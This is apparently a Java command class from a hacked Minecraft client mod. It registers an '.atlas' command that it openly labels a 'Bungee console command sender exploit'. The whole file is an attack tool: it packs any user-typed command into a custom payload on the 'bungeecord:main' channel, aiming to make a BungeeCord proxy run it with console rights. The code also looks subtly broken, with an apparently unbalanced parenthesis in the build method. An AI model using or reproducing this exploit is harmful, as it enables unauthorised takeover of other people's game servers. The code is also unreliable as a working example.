package io.github.spigotrce.paradiseclientfabric.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import net.minecraft.client.MinecraftClient;
import net.minecraft.command.CommandSource;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.minecraft.util.Identifier;
import io.netty.buffer.Unpooled;

import static net.minecraft.client.command.CommandManager.literal;
import static net.minecraft.client.command.CommandManager.argument;

public class BungeeConsole extends Command {
    public BungeeConsole(MinecraftClient minecraftClient) {
        super("atlas", "Bungee console command sender exploit", minecraftClient);
    }

    @Override
    public LiteralArgumentBuilder<CommandSource> build() {
        return literal(getName())
            .executes(context -> {
                Helper.printChatMessage("Usage: .atlas <command>");
                return 1;
            })
            .then(argument("command", StringArgumentType.greedyString())
                .executes(this::sendCommand);
    }

    private int sendCommand(CommandContext<CommandSource> context) {
        String command = StringArgumentType.getString(context, "command");

        PacketByteBuf buf = new PacketByteBuf(Unpooled.buffer());
        buf.writeString(command);

        Identifier channel = new Identifier("bungeecord", "main");
        CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(channel, buf);

        Helper.sendPacket(packet);
        Helper.printChatMessage("Payload sent to BungeeCord!");
        return 1;
    }
}
